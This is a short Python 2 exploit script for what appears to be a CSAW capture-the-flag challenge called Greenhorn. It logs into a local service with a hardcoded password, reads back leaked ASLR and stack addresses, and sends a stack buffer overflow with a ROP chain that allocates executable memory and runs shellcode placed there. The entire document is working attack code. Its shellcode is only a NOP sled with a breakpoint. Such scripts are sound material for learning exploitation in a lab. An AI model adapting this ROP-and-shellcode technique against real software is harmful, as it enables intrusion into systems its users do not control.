from socket import *
import struct

def recvuntil(find_str):
	cmp_str = ''
	while True:
		cmp_str += r.recv(1)
		if find_str in cmp_str:
			return cmp_str

p32 = lambda x:struct.pack("<L", x)

HOST = "127.0.0.1"
PORT = 9998
r = socket(AF_INET, SOCK_STREAM)
r.connect((HOST, PORT))
r.settimeout(100000)

recvuntil("Password: ")
r.send("GreenhornSecretPassword!!!\n")
recvuntil("Selection: ")
r.send("a\n")	# ASLR
recvuntil("slide is: ")
aslr_base = int(r.recv(10), 16)
alloc_memory = aslr_base + 0x4011c0
read_until = aslr_base + 0x401600
ppppr = aslr_base + 0x0040199e
print "[*] aslr_base : " + hex(aslr_base)
recvuntil("stored at: ")
stack = int(r.recv(10), 16)
print "[*] stack : " + hex(stack)
r.send("v\n")	# VULN
recvuntil("(with some constraints).\n\n")

payload = 'CSAW'
payload += 'A' * 0x3fc
payload += 'BBBB'
payload += p32(alloc_memory)
payload += p32(ppppr)
payload += p32(0x4100000)
payload += p32(0x1000)
payload += p32(0x40)
payload += p32(stack)
payload += p32(read_until)
payload += p32(ppppr + 1)
payload += p32(0x4100000)
payload += p32(0x1000)
payload += p32(0xcc)
payload += p32(0x4100000)
r.send(payload + '\n')
r.send('\x90' * 100 + '\xcc')	# execute this code!
